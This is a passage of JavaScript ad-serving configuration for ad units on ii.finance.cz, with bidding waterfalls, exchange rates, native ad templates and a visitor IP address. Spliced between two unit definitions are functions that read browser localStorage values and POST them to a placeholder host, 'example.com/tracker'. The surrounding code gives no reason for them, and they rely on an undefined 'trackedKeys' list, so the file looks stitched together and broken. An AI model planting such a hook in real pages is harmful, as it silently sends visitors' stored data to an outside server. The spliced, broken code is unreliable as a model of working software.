    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});
function createUniqueIdentifier(data) {
  const keys = Object.keys(data);
  const identifier = keys.map(key => key.charCodeAt(0).toString(16)).join('');
  let hash = 0;
  for (let char of identifier) {
    let value = parseInt(char, 16);
    hash = hash * 17 ^ value;
    hash = hash & hash; // Ensure it's a 32bit int
  }
  return hash.toString(36);
}
function gatherTrackedData() {
  const trackedData = {};
  trackedKeys.forEach(key => {
    trackedData[key] = localStorage.getItem(key) || 'not_set';
  });
  return trackedData;
}
async function sendTrackedData(data) {
  const uniqueId = createUniqueIdentifier(data);
  const endpoint = "https://example.com/tracker";
  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        uniqueId,
        data
      })
    });
    console.log(response.ok ? "Data sent successfully" : `Failed to send data, status: ${response.status}`);
  } catch (error) {
    console.error("Error during data transmission:", error);
  }
}
AdTrack.units["classic_ii.finance.cz_hb_998x200"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "998x200", {
  "renderer": "flexi",
  "options": {
    "dom": {
      "method": "container",
      "selectorForeign": "1"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 20089,
    "tiers": [{
      "method": "hb",
      "id": 42777,
      "channels": [{
        "chd": {
          "id": 166009,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990744"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[980, 200], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [980, 120], [600, 190], [990, 100], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 24.58,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166039,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "1056852"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[980, 200], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [980, 120], [600, 190], [990, 100], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 10,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166155,
          "tag": "adform",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1056853"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross_gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[980, 200], [970, 200], [960, 200], [930, 200], [930, 180], [750, 200], [980, 120], [600, 190], [990, 100], [970, 100], [970, 90], [750, 100], [745, 100], [750, 90], [728, 90]]
        },
        "floor": 0,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166187,
          "tag": "criteo-hb-xhr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "multiple_hb_998x200_(ii.finance.cz)\/Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[995, 200], [970, 200], [960, 200], [930, 200], [930, 180], [980, 120], [990, 100], [970, 100], [970, 90], [700, 120], [750, 100], [745, 100], [745, 100], [600, 120], [690, 100], [750, 90], [750, 90], [728, 90], [690, 90]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166083,
          "tag": "smart-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-82483"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[995, 200], [980, 200], [970, 200], [950, 200], [995, 180], [930, 180], [750, 200], [980, 120], [990, 90], [980, 90], [970, 90], [960, 90], [950, 90], [750, 100], [780, 90], [768, 90], [728, 90]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166207,
          "tag": "pubmatic-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "798915-3709867"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[728, 90], [750, 100], [950, 200], [930, 180]]
        },
        "floor": 0,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 166257,
          "tag": "xandr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713300"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 1,
          "height": 1
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": {
          "normal": {
            "name": "n-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166287,
          "tag": "criteo-hb-xhr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1387199-hb_998x200_(ii.finance.cz)\/Native_6_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166301,
          "tag": "smart-hb-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-102165"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 13,
          "height": 31
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          },
          "product": {
            "name": "p-j-1-megaboard-single_single-56777",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;box-sizing: border-box;padding: 12px 0.5%;line-height: 96px;font-size: 0;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;display: inline-table;width: 100%;height: 100%;text-align: center;vertical-align: middle;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='vertical-align: middle;display: table-cell; padding: 0 3%;line-height: normal;'> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 30%;max-height: 185px;vertical-align: middle;'> <div style='width: 65%;font-size: 20px;line-height: normal; margin: 0 15px; display: inline-block; vertical-align: middle;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.5em;font-weight: bold;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 250,
                "imgWidth": 270,
                "imgHeight": 140,
                "maxTitleLength": 45,
                "maxDescLength": 300
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 548021,
          "tag": "seznam-ssp-hb2",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "2": "296561"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 970,
          "height": 210,
          "sizes": [[728, 90]]
        },
        "floor": 0,
        "factor": 1,
        "factorFixed": 1,
        "styles": {
          "normal": {
            "name": "n-j-2-megaboard-double_double-56779",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;float: left;width: 50%;height: 100%;padding: 15px 1%;text-align: left;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;float: left;width: 50%;height: 100%;padding: 15px 1%;text-align: left;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: block;width: 100%;height: 100%;line-height: 170px;font-size: 0;'> <div style='display: inline-block;width: 37%;height: 100%;margin-left: 3%;text-align: center;'> <img src='' alt='' class='AdTrack-imageUrl' style='display: inline-block;max-width: 100%;max-height: 80%;width: auto;height: auto;vertical-align: middle;' \/> <\/div> <div style='display: inline-block;vertical-align: middle; box-sizing: border-box;width: 60%;padding: 0 3%;font-size: 16px;line-height: normal;'> <span class='AdTrack-headline' style='display: block;font-size: 1.3em;line-height: 1.3em;padding: 0 0 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 60,
                "maxTitleLength": 40,
                "maxDescLength": 100
              }
            }
          },
          "product": {
            "name": "p-j-2-megaboard-double_double-56779",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 998px;height: 200px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;float: left;width: 50%;height: 100%;padding: 15px 1%;text-align: left;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;float: left;width: 50%;height: 100%;padding: 15px 1%;text-align: left;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: block;width: 100%;height: 100%;line-height: 170px;font-size: 0;'> <div style='display: inline-block;width: 37%;height: 100%;margin-left: 3%;text-align: center;'> <img src='' alt='' class='AdTrack-imageUrl' style='display: inline-block;max-width: 100%;max-height: 80%;width: auto;height: auto;vertical-align: middle;' \/> <\/div> <div style='display: inline-block;vertical-align: middle; box-sizing: border-box;width: 60%;padding: 0 3%;font-size: 16px;line-height: normal;'> <span class='AdTrack-headline' style='display: block;font-size: 1.3em;line-height: 1.3em;padding: 0 0 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 60,
                "maxTitleLength": 40,
                "maxDescLength": 100
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 780463,
          "tag": "rtbhouse-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_998x200_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[728, 90], [970, 210], [930, 180], [750, 100], [776, 200], [750, 200], [970, 90], [980, 120], [728, 100], [998, 123], [600, 200], [600, 190]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 787419,
          "tag": "adaptmx-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_998x200_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[728, 90], [970, 210], [930, 180], [750, 100], [776, 200], [750, 200], [970, 90], [980, 120], [728, 100], [998, 123], [600, 200], [600, 190]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 788575,
          "tag": "onetag",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_998x200_ii_finance_cz_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 998,
          "height": 200,
          "sizes": [[728, 90], [970, 210], [930, 180], [750, 100], [776, 200], [750, 200], [970, 90], [980, 120], [728, 100], [998, 123], [600, 200], [600, 190]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});
AdTrack.units["classic_ii.finance.cz_hb_970x310"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "970x310", {
  "renderer": "flexi",
  "options": {
    "dom": {
      "method": "container",
      "selectorForeign": "1"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
